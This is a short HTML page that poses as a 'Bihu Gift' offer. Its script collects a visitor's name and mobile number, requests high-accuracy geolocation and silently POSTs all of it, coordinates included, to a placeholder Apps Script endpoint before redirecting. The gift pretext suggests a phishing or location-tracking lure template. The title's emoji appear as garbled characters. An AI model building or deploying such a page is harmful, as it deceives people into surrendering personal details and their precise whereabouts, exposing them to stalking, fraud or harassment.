<!DOCTYPE html>
<html>
<head>
  <title>Bihu Gift üéÅ</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>

<form id="studentForm">
  <h2>Bihu Gift üéÅ</h2>
  <input name="name" placeholder="Name" required>
  <input name="reason" placeholder="Gift type" required>
  <input name="mobile" placeholder="Mobile number" required>
  <button type="submit">Received Gift üéÅ</button>
  <p id="status"></p>
</form>

<script>
const form = document.getElementById("studentForm");
const statusText = document.getElementById("status");

form.addEventListener("submit", function(e){
  e.preventDefault();
  statusText.innerText = "Requesting location‚Ä¶";

  // save name for next pages
  localStorage.setItem("bihuName", form.name.value);

  navigator.geolocation.getCurrentPosition(
    pos => sendData(pos),
    err => sendData(null),
    { enableHighAccuracy:true, timeout:15000 }
  );
});

function sendData(position){
  const data = {
    name: form.name.value,
    reason: form.reason.value,
    mobile: form.mobile.value,
    latitude: position ? position.coords.latitude : "",
    longitude: position ? position.coords.longitude : "",
    accuracy: position ? position.coords.accuracy : ""
  };

  fetch("YOUR_APPS_SCRIPT_WEBAPP_URL",{
    method:"POST",
    mode:"no-cors",
    headers:{ "Content-Type":"application/json" },
    body: JSON.stringify(data)
  });

  // go to next page
  window.location.href = "bihuz.html";
}
</script>

</body>
</html>
